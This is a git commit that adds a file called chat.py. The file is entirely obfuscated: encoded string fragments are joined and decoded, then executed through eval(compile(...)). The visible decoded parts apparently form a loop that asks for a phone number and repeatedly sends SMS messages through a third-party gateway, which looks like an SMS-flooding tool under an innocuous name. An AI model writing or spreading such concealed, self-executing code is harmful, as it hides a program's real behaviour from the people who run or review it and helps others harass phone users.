5e985abd2f894a8a5c842a1d0452f94602a1fa2b
Mr. Foisal <83734733+MohammadFoisal@users.noreply.github.com>
2021-10-30 10:34:57 +0600

    Create chat.py

---
+++ chat.py
@@ -0,0 +1,11 @@
+
+ 
+
+import base64, codecs
+magic = 'aW1wb3J0IHJlcXVlc3RzCgoKd2hpbGUgMToKICAgIG51bT1pbnB1dCgiXG5lbnRlciBOdW1iZXI6ICIpCiAgICBzb'
+love = 'KZ9nJ5jqKDbVykhEJ50MKVtH21GBvNvXDbtVPNtGTyhnm0vnUE0pQbiYmV3YwRmZF4kAF4kZv9mMUOxL2piH2IhMS'
+god = 'NNUy5hc3B4P3NNU0lTRE49ODgiK251bSsiJnNNc2c9IitzbXMrIiZzU2hvcnRjb2RlPTIxMjAwIgogICAgeD1yZXF'
+destiny = '1MKA0pl5jo3A0XRkcozfcPvNtVPOjpzyhqPu4YaEyrUDfVPVtVPNtVPNvYUA0pvuhqJ0cYPWpqPVfp3ElXUAgplxc'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
